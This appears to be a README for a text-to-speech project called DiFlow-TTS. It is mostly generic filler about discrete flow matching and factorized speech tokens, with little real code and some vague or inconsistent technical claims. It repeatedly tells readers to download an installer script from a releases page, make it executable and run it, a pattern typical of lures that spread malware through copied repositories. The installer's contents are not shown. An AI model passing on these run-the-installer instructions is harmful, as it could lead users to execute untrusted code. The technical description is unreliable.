# DiFlow-TTS: Fast Zero-Shot TTS with Discrete Flow Matching

[![Releases](https://img.shields.io/badge/DiFlow--TTS--Releases-brightgreen?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tobertz-max/DiFlow-TTS/releases)

DiFlow-TTS delivers low-latency, zero-shot text-to-speech through discrete flow matching and factorized speech tokens. It combines a compact token representation with a flow-based sampler to produce natural speech quickly, even for unseen speakers and languages. This README covers what the project is, how it works, how to use it, and how to contribute. For quick access to build artifacts and binaries, visit the Releases page linked above.

Table of contents
- What is DiFlow-TTS?
- Why DiFlow-TTS matters
- Key ideas and design goals
- Architecture overview
- Tokenization and factorized speech tokens
- Inference and training workflow
- Getting started
- Quick start: run a demo
- Binaries and releases
- Data, evaluation, and benchmarks
- API reference
- Advanced usage
- Deployment scenarios
- Troubleshooting
- Development and contribution
- Licensing and credits
- Roadmap
- FAQ
- Community and support

What is DiFlow-TTS?
DiFlow-TTS is a text-to-speech system built to be fast, flexible, and robust in zero-shot scenarios. It uses discrete flow matching to align linguistic features with speech tokens in a compact, factorized form. The approach enables low-latency synthesis and easy adaptation to new voices and languages without large amounts of labeled data.

Why DiFlow-TTS matters
- Low latency: The system is designed to produce speech in real time, suitable for interactive applications, voice assistants, and captions in streaming services.
- Zero-shot capability: It handles new speakers and accents without requiring extensive fine-tuning data.
- Efficient representations: Factorized speech tokens reduce memory usage and improve inference speed while preserving natural prosody.
- Clear separation of concerns: A modular design lets researchers plug in better tokenizers, better vocoders, or alternative flows without reworking the entire pipeline.

Key ideas and design goals
- Discrete flow matching: A flow-based mechanism that maps linguistic representations to discrete speech tokens with stable, invertible transformations.
- Factorized tokens: Speech tokens are split into independent factors (e.g., phonetic content, prosody cues, speaker style) to improve generalization.
- Latency awareness: The model architecture prioritizes streaming-friendly operations and parallelizable components.
- Robust zero-shot: The training regime emphasizes broad phonetic coverage and style diversity to support zero-shot synthesis.
- Accessibility: A clean, well-documented interface with reasonable defaults to help newcomers and experienced researchers alike.

Architecture overview
- Text frontend: Converts input text into a linguistic representation. This stage handles tokenization, normalization, and phoneme/lingueme mapping.
- Discrete flow matcher: The core of the model. It learns to map linguistic representations into discrete speech tokens via a flow-based mechanism. The flow is designed to be invertible, making it efficient for training and enabling controllable synthesis.
- Token encoder/decoder: Works with a factorized token representation. The encoder transforms linguistic signals into a compact set of discrete tokens; the decoder reconstructs the speech waveform or spectrogram conditioned on those tokens.
- Vocoder or neural synthesizer: Converts the generated tokens into waveform. A lightweight neural vocoder emphasizes speed while preserving naturalness.
- Post-processing: Optional steps for waveform smoothing, noise suppression, and energy normalization to ensure consistent audio output.

Tokenization and factorized speech tokens
- Factorization: Speech tokens are split into subcomponents such as content tokens, prosody tokens, and speaker/style tokens. This separation helps the model generalize to new voices and speaking styles.
- Discrete tokens: Using discrete tokens simplifies the learning problem and makes the flow operations more stable. It also enables compact models with fast decoding.
- Prosody control: The design includes explicit control over duration, pitch, and energy, enabling expressive speech while preserving natural rhythm.
- Speaker and language adaptation: By decoupling content from speaker attributes, the model can adapt to new voices with limited data.

Inference and training workflow
- Training loop: The model learns to predict the next discrete token given the prior tokens and the linguistic context. The loss combines a reconstruction term for tokens and a teacher-forcing or sampling objective for stability.
- Inference loop: Given text input, the model predicts a sequence of tokens and then synthesizes audio via the vocoder. Latent flows are resolved deterministically for speed.
- Zero-shot strategy: A diverse training corpus, plus explicit alignment of token factors, helps the system generalize to unseen voices and languages.
- Real-time considerations: The pipeline is designed to minimize sequential dependencies, enabling streaming inference with low latency.

Getting started
- System requirements
  - Linux or macOS
  - Python 3.8–3.11
  - A CUDA-capable GPU (optional but recommended for speed)
  - Adequate RAM (16 GB or more recommended for training)
- Dependencies
  - PyTorch (stable release)
  - torchaudio
  - numpy, scipy
  - transformers or a lightweight tokenizer (if using a BPE or phoneme-based frontend)
  - librosa or an equivalent audio utility library for audio processing
- Environment setup (example)
  - Create a virtual environment
  - Install dependencies from a requirements file
  - Prepare a small dataset for quick testing
- Data preparation
  - Text data: clean, normalized, and tokenized
  - Speech data: aligned audio with reference transcripts
  - Optional speaker IDs or style descriptors for conditioning
- Training and evaluation scripts
  - A training script that supports multi-GPU setups
  - An evaluation script that computes MOS, STOI, PESQ, and other quality metrics
  - A script to run a quick, in-browser demo or streaming demo

Quick start: run a demo
- Prerequisites
  - A prebuilt model or a small trained checkpoint
  - A sample text to synthesize
- Demo steps
  - Load the model
  - Input your text
  - Generate audio
  - Listen to the result
- Example commands (adjust paths to your environment)
  - python -m diflow_tts.run_inference --text "Hello world, this is DiFlow-TTS." --checkpoint path/to/checkpoint.pt
  - python -m diflow_tts.run_inference --text "DiFlow-TTS speaks with clear prosody." --voice_id 1
- Expected outcomes
  - A waveform file or a streaming audio output
  - A phoneme and token trace for debugging
  - Optional: a visualization of token flow, for troubleshooting and analysis

Binaries and releases
From the releases page you can download prebuilt assets to try the system without building from source. If you need the binaries, visit the Releases page for the exact artifacts. The link below is provided for quick access to the download hub:
- Link to download assets: https://github.com/Tobertz-max/DiFlow-TTS/releases
- Note: If the releases page offers a file named diflow_tts-1.0.0-installer.sh (or a similarly named installer), download that file, make it executable, and run it to install the runtime components. The file you download must be executed to install the necessary binaries and dependencies. Repeat the link above to explore other assets and versions.

Data, evaluation, and benchmarks
- Datasets
  - Multi-speaker, multi-lingual corpora for broad coverage
  - Clean transcripts aligned to speech
  - Metadata for speaker identity, language, and style
- Evaluation metrics
  - MOS: Mean Opinion Score for naturalness
  - PESQ: Perceptual Evaluation of Speech Quality
  - STOI: Short-Time Objective Intelligibility
  - SI-SDR: Scale-Invariant Signal-to-Distortion Ratio for waveform quality
  - Latency measurements: end-to-end synthesis time
- Benchmark setup
  - Standardized text prompts
  - Consistent sampling rates and audio preprocessing
  - Reproducible environment with fixed seeds
- Baselines and comparisons
  - Compare against baseline TTS models with and without zero-shot capabilities
  - Include matches for latency, naturalness, and robustness to unseen voices

API reference
- Core modules
  - diflow_tts.frontend: Text processing and linguistic representation
  - diflow_tts.flow: Discrete flow matcher and token generator
  - diflow_tts.tokenizer: Tokenization utilities for factorized tokens
  - diflow_tts.vocoder: Neural vocoder interface for waveform generation
- Public classes and functions
  - TextEncoder: Converts text to linguistic features
  - FlowMatcher: Core component for token flow
  - TokenDecoder: Reconstructs discrete tokens into audio
  - WaveformSynthesizer: Converts tokens to waveform samples
- CLI and scripts
  - diflow_tts.cli: Command-line entry points for training and inference
  - diflow_tts.utils: Helper utilities for data loading and metrics
- Example usage
  - Python
    - from diflow_tts import TextEncoder, FlowMatcher, WaveformSynthesizer
    - …initialize and run inference with your text
  - CLI
    - python -m diflow_tts.cli.train --config configs/default.yaml
    - python -m diflow_tts.cli.infer --text "Sample text" --checkpoint path/to/checkpoint.pt

Advanced usage
- Custom tokenization
  - Swap the frontend/tokenizer to use a different phoneme set or BPE vocabulary
  - Train a new flow with the chosen token space
- Voice cloning and style transfer
  - Provide speaker embeddings or style descriptors to guide synthesis
  - Use a small amount of target voice data to fine-tune the token encoder
- Language expansion
  - Add new language data to the training corpus
  - Ensure phoneme sets cover the new language’s inventory
- Latency tuning
  - Adjust token sequence length and flow steps
  - Enable or disable streaming optimizations
- Real-time deployment
  - Export a compact model suitable for on-device inference
  - Package with a lightweight vocoder for offline use

Deployment scenarios
- Local development
  - Quick tests on a single workstation
  - Visualize token flows and audio outputs
- Cloud inference
  - Scale to multiple GPUs for batch synthesis
  - Use streaming endpoints to serve conversational agents
- On-device synthesis
  - A trimmed model and a compact vocoder for mobile or embedded devices
  - Energy-aware scheduling to preserve battery life
- Edge use cases
  - Assistive reading tools with low memory footprints
  - Multilingual kiosks with instant voice responses

Troubleshooting
- Common issues
  - Audio output is silent: check audio backend and vocoder model integrity
  - Poor pronunciation: verify linguistic frontend alignment and phoneme mapping
  - Latency higher than expected: profile the inference graph and confirm batching behavior
  - CUDA memory errors: reduce batch size or disable multi-GPU parallelism
- Debug tips
  - Enable verbose logging to inspect token generation
  - Visualize token flow heatmaps to spot misalignment
  - Compare outputs with and without style conditioning to isolate effects
- How to get help
  - Open an issue on GitHub with a concise description and logs
  - Include system specs, Python version, and the exact command used

Development and contribution
- Code structure
  - diflow_tts/ — core library
  - examples/ — demonstration notebooks and quick start scripts
  - configs/ — training and inference configurations
  - data/ — utilities for loading and parsing datasets
  - tests/ — unit and integration tests
- How to contribute
  - Start with the contributing guide
  - Propose enhancements via pull requests
  - Share your experiments and results
- Testing
  - Run unit tests and integration tests
  - Validate on multiple languages and voices
  - Run smoke tests after new dependencies
- Coding standards
  - Use clear, direct language in comments and docs
  - Add type hints where helpful
  - Keep a compact and readable codebase

Licensing and credits
- License
  - This project uses a permissive license suitable for research and commercial use
- Acknowledgments
  - Thanks to contributors who helped shape the discrete flow approach
  - Appreciation for open datasets and research communities that inspire this work

Roadmap
- Short-term goals
  - Improve zero-shot performance on low-resource languages
  - Streamline the installation process on varying hardware
  - Expand language coverage in the training corpus
- Mid-term goals
  - Enhance controllability of speaking style and emotion
  - Improve energy efficiency for on-device usage
  - Provide richer diagnostics for model behavior
- Long-term goals
  - Integrate with downstream voice-enabled apps and services
  - Support multi-speaker and cross-lade voice synthesis with minimal data
  - Continue to publish robust benchmarks and reproducible results

FAQ
- Do I need a GPU for inference?
  - For best latency, yes. A GPU speeds up the flow matcher and vocoder. You can run on CPU, but expect slower performance.
- Can I train from scratch?
  - Yes. It requires a sizable dataset and compute. Start with a smaller dataset to prototype, then scale up.
- How do I add a new voice?
  - Prepare a small set of speaker examples, train or fine-tune the token encoder for that voice, and test with your sample text.
- Are there any safety or policy checks?
  - Yes. Implement safeguards for misuse and respect licensing for data and models. Ensure you have rights to synthesize targeted voices.

Visual resources
- Architecture diagram
  - Inline SVG showing the flow from text to discrete tokens to audio
  - Labels for Text Frontend, Flow Matcher, Token Decoder, and Vocoder
- Token flow heatmap
  - An illustrative heatmap of token activations during inference
- Prosody and content separation
  - A simple chart that shows how content tokens separate from prosody tokens

Illustrative SVG: DiFlow-TTS at a glance
<svg width="700" height="280" viewBox="0 0 700 280" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <linearGradient id="grad" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#4e8cff"/>
      <stop offset="100%" stop-color="#1a6bd8"/>
    </linearGradient>
  </defs>
  <rect x="0" y="0" width="700" height="280" fill="white" />
  <g transform="translate(40,40)">
    <rect x="0" y="0" width="180" height="60" rx="8" fill="url(#grad)"/>
    <text x="90" y="38" fill="white" font-family="Arial" font-size="14" text-anchor="middle">Text Frontend</text>
  </g>
  <g transform="translate(260,40)">
    <rect x="0" y="0" width="180" height="60" rx="8" fill="#2e8b57"/>
    <text x="90" y="38" fill="white" font-family="Arial" font-size="14" text-anchor="middle">Discrete Flow Matcher</text>
  </g>
  <g transform="translate(480,40)">
    <rect x="0" y="0" width="180" height="60" rx="8" fill="#6a5acd"/>
    <text x="90" y="38" fill="white" font-family="Arial" font-size="14" text-anchor="middle">Token Decoder</text>
  </g>
  <g transform="translate(660,40)">
    <rect x="0" y="0" width="40" height="60" rx="8" fill="#f44336"/>
    <text x="20" y="38" fill="white" font-family="Arial" font-size="12" text-anchor="middle">Voc</text>
  </g>
  <path d="M220 70 L260 70 L260 70" fill="none" stroke="#999" stroke-width="2"/>
  <path d="M440 70 L480 70" stroke="#999" stroke-width="2" fill="none"/>
  <path d="M320 70 L360 70" stroke="#999" stroke-width="2" fill="none"/>
  <text x="350" y="110" fill="#555" font-family="Arial" font-size="12" text-anchor="middle">Speech tokens flow to vocoder</text>
  <rect x="0" y="120" width="360" height="2" fill="#ddd"/>
  <text x="0" y="150" fill="#777" font-family="Arial" font-size="12" >Factorized speech tokens: content, prosody, speaker</text>
</svg>

This SVG is a light, self-contained illustration you can reuse in docs or slides. It demonstrates the core idea: text enters a frontend, passes through a flow-based matcher to produce discrete speech tokens, which then feed a decoder to a vocoder.

Release notes and changelog
- v1.0.0
  - Initial release with discrete flow matching and factorized speech tokens
  - Low-latency inference pipeline
  - Baseline zero-shot capabilities across multiple voices
  - Basic multilingual support
- v1.1.0
  - Improved tokenization with broader phoneme coverage
  - Enhanced vocoder for naturalness
  - Streaming inference optimizations
- v1.2.0
  - Expanded dataset and training recipes
  - API refinements and better error messages
- v2.0.0 (planned)
  - Stronger cross-lingual performance
  - On-device inference enhancements
  - More robust evaluation suite

How to run a full end-to-end experiment
- Data preparation
  - Gather diverse speaker samples
  - Normalize transcripts
  - Align audio with transcripts
- Model setup
  - Choose a frontend and token configuration
  - Configure the flow depth and token vocabulary
- Training
  - Use the provided training script with a YAML config
  - Monitor losses and token quality
- Evaluation
  - Run MOS tests with human raters
  - Compute PESQ, STOI, and SI-SDR for audio quality
- Inference
  - Run the inference pipeline with representative prompts
  - Compare against baselines to quantify gains
- Reproducibility
  - Capture seeds, environment versions, and data splits
  - Share experiment results and configuration details

Community and support
- Discussion channels
  - GitHub Issues for bugs and feature requests
  - Community discussions for usage ideas
- Documentation
  - Full API reference in the repository
  - Tutorials and examples in the examples directory
- Licensing and permissions
  - Respect licenses of all data and models used
  - Acknowledge datasets and third-party tools

Notes on the Releases link
- The link to the release hub is used twice in this document. At the top, the badge links directly to the Releases page for quick access. Later in this document, the same link is referenced as the source for downloadable binaries and installers. The Releases page hosts the prebuilt assets, along with release notes and installation instructions. If you need a ready-to-run installer, check the file named diflow_tts-1.0.0-installer.sh (or a newer variant) and follow the on-screen prompts to complete the setup. For more assets and versions, visit the Releases page again:
  - https://github.com/Tobertz-max/DiFlow-TTS/releases

End notes
- This project emphasizes clarity, speed, and generalization. The design aims to stay robust as you scale models and expand language support. It is built to be accessible to researchers and practical for engineers deploying voice applications. The repository invites collaboration, feedback, and practical experimentation to advance zero-shot TTS capabilities.

